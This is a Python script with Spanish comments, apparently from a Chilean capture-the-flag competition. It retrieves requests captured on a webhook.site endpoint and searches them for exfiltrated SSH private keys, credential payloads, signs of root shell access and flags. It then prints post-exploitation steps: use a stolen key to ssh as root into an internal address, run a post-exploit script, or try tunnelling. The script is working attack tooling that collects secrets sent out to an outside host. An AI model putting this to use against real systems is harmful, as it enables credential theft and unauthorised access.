#!/usr/bin/env python3
"""
CTF Chile - Analizador automático de webhook
Analiza los resultados del webhook para encontrar claves SSH y credenciales
"""
import requests
import re
import base64

def analyze_webhook(webhook_uuid):
    print(f"🔍 ANALIZANDO WEBHOOK: {webhook_uuid}")
    print("=" * 50)

    try:
        # Obtener todos los requests del webhook
        r = requests.get(f"https://webhook.site/token/{webhook_uuid}/requests?per_page=200", timeout=10)
        requests_data = r.json().get("data", [])
        print(f"📊 Total de requests: {len(requests_data)}")

        ssh_keys = []
        ssh_successes = []
        credentials = []
        flags = []

        for req in requests_data:
            url = req.get("url", "")
            content = req.get("content", "")
            text_content = req.get("text_content", "")

            # Combinar ambos contenidos
            full_content = (content + " " + text_content)

            # Extraer el tag del path
            path_parts = url.split("/")
            tag = path_parts[-1] if path_parts else "unknown"

            if not full_content.strip():
                continue

            # Buscar claves SSH privadas
            ssh_key_patterns = [
                r"-----BEGIN RSA PRIVATE KEY-----.*?-----END RSA PRIVATE KEY-----",
                r"-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----",
                r"-----BEGIN EC PRIVATE KEY-----.*?-----END EC PRIVATE KEY-----",
                r"-----BEGIN PRIVATE KEY-----.*?-----END PRIVATE KEY-----"
            ]

            for pattern in ssh_key_patterns:
                matches = re.findall(pattern, full_content, re.DOTALL)
                for match in matches:
                    ssh_keys.append({"tag": tag, "key": match.strip()})

            # Buscar éxitos de SSH
            ssh_success_patterns = [
                "SUCCESS_SSH",
                "whoami",
                "Permission granted",
                "Authentication successful",
                "root@",
                "admin@",
                "ubuntu@"
            ]

            for pattern in ssh_success_patterns:
                if pattern.lower() in full_content.lower():
                    ssh_successes.append({"tag": tag, "content": full_content[:200]})
                    break

            # Buscar credenciales
            if any(keyword in tag.lower() for keyword in ["password", "cred", "auth"]):
                if full_content.strip() and len(full_content) > 10:
                    credentials.append({"tag": tag, "content": full_content[:500]})

            # Buscar flags
            flag_patterns = ["ctf{", "flag{", "chile{"]
            for pattern in flag_patterns:
                if pattern in full_content.lower():
                    # Extraer la flag completa
                    start = full_content.lower().find(pattern)
                    if start != -1:
                        end = full_content.find("}", start)
                        if end != -1:
                            flag = full_content[start:end+1]
                            flags.append({"tag": tag, "flag": flag})

        # Mostrar resultados
        print("\n🔑 CLAVES SSH ENCONTRADAS:")
        if ssh_keys:
            for i, key_data in enumerate(ssh_keys):
                print(f"\n[{i+1}] Fuente: {key_data['tag']}")
                print("Clave:")
                print(key_data['key'])
                print("-" * 40)
        else:
            print("❌ No se encontraron claves SSH privadas")

        print("\n✅ ÉXITOS SSH:")
        if ssh_successes:
            for success in ssh_successes:
                print(f"• {success['tag']}: {success['content'][:100]}...")
        else:
            print("❌ No se encontraron conexiones SSH exitosas")

        print("\n🔐 CREDENCIALES:")
        if credentials:
            for cred in credentials:
                print(f"• {cred['tag']}: {cred['content'][:200]}...")
        else:
            print("❌ No se encontraron credenciales explícitas")

        print("\n🏆 FLAGS ENCONTRADAS:")
        if flags:
            for flag_data in flags:
                print(f"• {flag_data['tag']}: {flag_data['flag']}")
        else:
            print("❌ No se encontraron flags en este nivel")

        # Recomendaciones
        print("\n💡 PRÓXIMOS PASOS:")
        if ssh_keys:
            print("1. Copia una clave SSH y guárdala en un archivo")
            print("2. chmod 600 archivo_clave")
            print("3. ssh -i archivo_clave root@10.160.209.1")
        elif ssh_successes:
            print("1. Parece que SSH funcionó - revisa los detalles")
            print("2. Usa ssh_post_exploit.py para buscar flags")
        else:
            print("1. SSH no funcionó - intenta métodos alternativos")
            print("2. Busca otras vulnerabilidades en servicios internos")
            print("3. Explora túneles o port forwarding")

    except Exception as e:
        print(f"❌ Error analizando webhook: {e}")

if __name__ == "__main__":
    # Webhook del último script
    webhook_uuid = "f7672de0-0175-4e65-b60f-14b482dd717c"
    analyze_webhook(webhook_uuid)